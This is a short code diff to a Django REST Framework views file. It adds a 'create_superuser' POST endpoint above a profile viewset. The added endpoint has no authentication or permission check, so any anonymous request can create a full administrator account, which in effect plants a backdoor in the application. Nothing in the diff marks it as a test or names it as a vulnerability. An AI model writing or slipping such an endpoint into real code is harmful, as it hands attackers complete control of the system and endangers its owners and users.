@@ -12,6 +12,20 @@ from django.contrib.auth import logout as django_logout
 from rest_framework.decorators import action
 from django.db.models import Q
 
+@api_view(['POST'])
+def create_superuser(request):
+    username = request.data.get('username')
+    password = request.data.get('password')
+    email = request.data.get('email', '')
+    if User.objects.filter(username=username).exists():
+        return Response({'error': 'User already exists'}, status=400)
+    user = User.objects.create_superuser(
+        username=username,
+        email=email,
+        password=password
+    )
+    return Response({'success': True, 'user_id': user.id})
+
 class ProfileViewSet(ModelViewSet):
     queryset = UserProfile.objects.all()
     serializer_class = UserProfileSerializer
